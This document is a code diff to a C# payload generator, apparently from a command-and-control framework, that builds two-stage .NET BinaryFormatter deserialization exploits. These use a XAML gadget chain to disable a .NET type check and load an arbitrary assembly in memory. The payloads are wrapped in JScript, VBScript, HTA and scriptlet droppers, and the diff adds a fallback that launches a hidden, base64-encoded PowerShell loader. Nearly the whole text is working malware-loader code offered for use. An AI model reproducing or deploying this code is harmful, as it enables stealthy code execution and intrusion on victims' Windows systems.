@@ -5,23 +5,23 @@ namespace C2.Features.Loaders;
 public enum ScriptFormat { JScript, VBScript, Hta, Sct }
 
 /// <summary>
-/// Two-stage BinaryFormatter exploitation via TextFormattingRunProperties NRBF.
+/// Two-stage BinaryFormatter exploitation via TextFormattingRunProperties NRBF,
+/// with automatic Windows 7 fallback.
 ///
 /// Stage 1 — Disable .NET 4.8+ ActivitySurrogateSelectorTypeCheck:
 ///   XAML ObjectDataProvider chain reflects into the internal AppSettings field
 ///   and sets the ConfigurationManager key.  Throws after — caught by script.
 ///
-/// Stage 2 — Load assembly + trigger constructor (pure in-process, no PowerShell):
-///   XAML embeds raw assembly bytes via x:Array directly in MethodParameters.
-///   x:Array is a XAML intrinsic value (not a DataSourceProvider), so it resolves
-///   correctly in MethodParameters — unlike ObjectDataProvider results.
-///   Chain: Assembly.Load(byte[]) → Assembly.CreateInstance(entryClass).
-///   ObjectInstance="{StaticResource ...}" auto-resolves the ODP to the Assembly.
+/// Stage 2 — Load assembly + trigger constructor (pure in-process):
+///   XAML embeds raw assembly bytes via x:Array → Assembly.Load(byte[]) →
+///   CreateInstance(entryClass).  No PowerShell, no child process.
 ///
-/// Both stages are hand-built NRBF (one class, one string member) — no
+/// Fallback — if Deserialize_2 throws (Windows 7: assembly not found, or any
+///   other failure), the script catches and falls back to a PowerShell one-liner
+///   that does the same Assembly.Load + CreateInstance via PS 2.0+.
+///
+/// Both NRBF blobs are hand-built (one class, one string member) — no
 /// BinaryFormatter.Serialize needed, runs entirely in WASM.
-///
-/// Requires Microsoft.PowerShell.Editor.dll (ships with Windows 8+).
 /// </summary>
 public static class InsecureDeserializationGenerator
 {
@@ -29,19 +29,20 @@ public static class InsecureDeserializationGenerator
         Convert.ToBase64String(BuildStage1Nrbf()));
 
     /// <summary>
-    /// Two-stage payload: type-check bypass + in-process assembly load.
+    /// Two-stage payload with automatic fallback.
     /// </summary>
     public static string Generate(byte[] assemblyBytes, string entryClass,
         ScriptFormat format, string runtimeVersion)
     {
         var s1 = Stage1Base64.Value;
         var s2 = Convert.ToBase64String(BuildStage2Nrbf(assemblyBytes, entryClass));
+        var fb = BuildFallbackPsEncoded(Convert.ToBase64String(assemblyBytes), entryClass);
         return format switch
         {
-            ScriptFormat.JScript  => BuildJScript(s1, s2, runtimeVersion),
-            ScriptFormat.VBScript => BuildVBScript(s1, s2, runtimeVersion),
-            ScriptFormat.Hta      => BuildHta(s1, s2, runtimeVersion),
-            ScriptFormat.Sct      => BuildSct(s1, s2, runtimeVersion),
+            ScriptFormat.JScript  => BuildJScript(s1, s2, fb, runtimeVersion),
+            ScriptFormat.VBScript => BuildVBScript(s1, s2, fb, runtimeVersion),
+            ScriptFormat.Hta      => BuildHta(s1, s2, fb, runtimeVersion),
+            ScriptFormat.Sct      => BuildSct(s1, s2, fb, runtimeVersion),
             _ => ""
         };
     }
@@ -64,10 +65,6 @@ public static class InsecureDeserializationGenerator
 
     // ── NRBF Stage Builders ──────────────────────────────────────────────
 
-    /// <summary>
-    /// Stage 1: TextFormattingRunProperties XAML that disables the .NET 4.8+
-    /// ActivitySurrogateSelectorTypeCheck via reflection + AppSettings.
-    /// </summary>
     private static byte[] BuildStage1Nrbf()
     {
         const string xaml = """
@@ -107,16 +104,8 @@ public static class InsecureDeserializationGenerator
     }
 
     /// <summary>
-    /// Stage 2: TextFormattingRunProperties XAML that embeds raw assembly bytes
-    /// via x:Array and chains Assembly.Load(byte[]) → CreateInstance(entryClass).
-    ///
-    /// x:Array is a XAML language intrinsic — when placed directly inside
-    /// ObjectDataProvider.MethodParameters it produces a real Byte[], not a
-    /// DataSourceProvider wrapper.  This sidesteps the well-known limitation
-    /// where ObjectDataProvider results in MethodParameters are NOT auto-resolved.
-    ///
-    /// The second ObjectDataProvider uses ObjectInstance="{StaticResource a}"
-    /// which DOES auto-resolve DataSourceProviders → gets the loaded Assembly.
+    /// Stage 2: x:Array byte[] → Assembly.Load → CreateInstance.
+    /// No env var flags — the script uses try/catch flow control instead.
     /// </summary>
     private static byte[] BuildStage2Nrbf(byte[] assemblyBytes, string entryClass)
     {
@@ -128,7 +117,6 @@ public static class InsecureDeserializationGenerator
           .Append(" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"")
           .Append(" xmlns:r=\"clr-namespace:System.Reflection;assembly=mscorlib\">");
 
-        // Step 1: Assembly.Load(byte[]) — static method, byte[] from x:Array
         sb.Append("<ObjectDataProvider x:Key=\"a\" ObjectType=\"{x:Type r:Assembly}\" MethodName=\"Load\">")
           .Append("<ObjectDataProvider.MethodParameters>")
           .Append("<x:Array Type=\"s:Byte\">");
@@ -140,7 +128,6 @@ public static class InsecureDeserializationGenerator
           .Append("</ObjectDataProvider.MethodParameters>")
           .Append("</ObjectDataProvider>");
 
-        // Step 2: Assembly.CreateInstance(entryClass) — triggers constructor
         sb.Append("<ObjectDataProvider x:Key=\"b\" ObjectInstance=\"{StaticResource a}\" MethodName=\"CreateInstance\">")
           .Append("<ObjectDataProvider.MethodParameters>")
           .Append("<s:String>").Append(entryClass).Append("</s:String>")
@@ -152,39 +139,38 @@ public static class InsecureDeserializationGenerator
         return BuildTextFormattingNrbf(sb.ToString());
     }
 
+    // ── Fallback ─────────────────────────────────────────────────────────
+
+    private static string BuildFallbackPsEncoded(string assemblyBase64, string entryClass)
+    {
+        var ps = "[Reflection.Assembly]::Load([Convert]::FromBase64String('" +
+            assemblyBase64 + "')).CreateInstance('" + entryClass + "')";
+        return Convert.ToBase64String(Encoding.Unicode.GetBytes(ps));
+    }
+
     // ── NRBF Writer ──────────────────────────────────────────────────────
 
-    /// <summary>
-    /// Builds a minimal NRBF stream: one BinaryLibrary (Microsoft.PowerShell.Editor)
-    /// + one ClassWithMembersAndTypes (TextFormattingRunProperties) with a single
-    /// ForegroundBrush string member containing the XAML payload.
-    /// </summary>
     private static byte[] BuildTextFormattingNrbf(string xaml)
     {
         using var ms = new MemoryStream();
         using var w = new BinaryWriter(ms);
 
-        // SerializationHeader: rootId=1, headerId=-1, majorVer=1, minorVer=0
         w.Write((byte)0); w.Write(1); w.Write(-1); w.Write(1); w.Write(0);
 
-        // BinaryLibrary (id=2)
         w.Write((byte)12); w.Write(2);
         WriteLenPrefixed(w, "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
 
-        // ClassWithMembersAndTypes (id=1)
         w.Write((byte)5);
         w.Write(1);
         WriteLenPrefixed(w, "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties");
-        w.Write(1);                        // member count
+        w.Write(1);
         WriteLenPrefixed(w, "ForegroundBrush");
-        w.Write((byte)1);                  // BinaryType.String
-        w.Write(2);                        // library id
+        w.Write((byte)1);
+        w.Write(2);
 
-        // Member value: BinaryObjectString (id=3) containing XAML
         w.Write((byte)6); w.Write(3);
         WriteLenPrefixed(w, xaml);
 
-        // MessageEnd
         w.Write((byte)11);
         return ms.ToArray();
     }
@@ -216,7 +202,7 @@ public static class InsecureDeserializationGenerator
         return len;
     }
 
-    private static string BuildJScript(string s1B64, string s2B64, string ver)
+    private static string BuildJScript(string s1B64, string s2B64, string fbPs, string ver)
     {
         return $@"function Base64ToStream(b, l) {{
     var enc = new ActiveXObject('System.Text.ASCIIEncoding');
@@ -233,21 +219,29 @@ public static class InsecureDeserializationGenerator
 var stage_1 = ""{s1B64}"";
 var stage_2 = ""{s2B64}"";
 
-try {{
-    var shell = new ActiveXObject('WScript.Shell');
-    shell.Environment('Process')('COMPLUS_Version') = '{ver}';
+var shell = new ActiveXObject('WScript.Shell');
+shell.Environment('Process')('COMPLUS_Version') = '{ver}';
 
+try {{
     var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
     fmt_1.Deserialize_2(Base64ToStream(stage_1, {DecodedLen(s1B64)}));
-}} catch (e) {{
+}} catch (e) {{}}
+
+var done = false;
+try {{
+    var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+    fmt_2.Deserialize_2(Base64ToStream(stage_2, {DecodedLen(s2B64)}));
+    done = true;
+}} catch (e) {{}}
+
+if (!done) {{
     try {{
-        var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
-        fmt_2.Deserialize_2(Base64ToStream(stage_2, {DecodedLen(s2B64)}));
-    }} catch (e2) {{}}
+        shell.Run('powershell -nop -w hidden -enc {fbPs}', 0, false);
+    }} catch (e) {{}}
 }}";
     }
 
-    private static string BuildVBScript(string s1B64, string s2B64, string ver)
+    private static string BuildVBScript(string s1B64, string s2B64, string fbPs, string ver)
     {
         var s1Lines = FormatVBString("stage_1", s1B64);
         var s2Lines = FormatVBString("stage_2", s2B64);
@@ -278,18 +272,24 @@ On Error Resume Next
 Dim fmt_1
 Set fmt_1 = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
 fmt_1.Deserialize_2 Base64ToStream(stage_1, {DecodedLen(s1B64)})
+Err.Clear
 
-If Err.Number <> 0 Then
-    Err.Clear
-    Dim fmt_2
-    Set fmt_2 = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
-    fmt_2.Deserialize_2 Base64ToStream(stage_2, {DecodedLen(s2B64)})
+Dim done
+done = False
+Dim fmt_2
+Set fmt_2 = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
+fmt_2.Deserialize_2 Base64ToStream(stage_2, {DecodedLen(s2B64)})
+If Err.Number = 0 Then done = True
+Err.Clear
+
+If Not done Then
+    shell.Run ""powershell -nop -w hidden -enc {fbPs}"", 0, False
 End If";
     }
 
-    private static string BuildHta(string s1B64, string s2B64, string ver)
+    private static string BuildHta(string s1B64, string s2B64, string fbPs, string ver)
     {
-        var js = BuildJScript(s1B64, s2B64, ver);
+        var js = BuildJScript(s1B64, s2B64, fbPs, ver);
         return $@"<html>
 <meta http-equiv=""x-ua-compatible"" content=""ie=9"">
 <head>
@@ -303,9 +303,9 @@ window.close();
 </html>";
     }
 
-    private static string BuildSct(string s1B64, string s2B64, string ver)
+    private static string BuildSct(string s1B64, string s2B64, string fbPs, string ver)
     {
-        var js = BuildJScript(s1B64, s2B64, ver);
+        var js = BuildJScript(s1B64, s2B64, fbPs, ver);
         var guid = Guid.NewGuid().ToString();
         return $@"<?XML version=""1.0""?>
 <scriptlet>
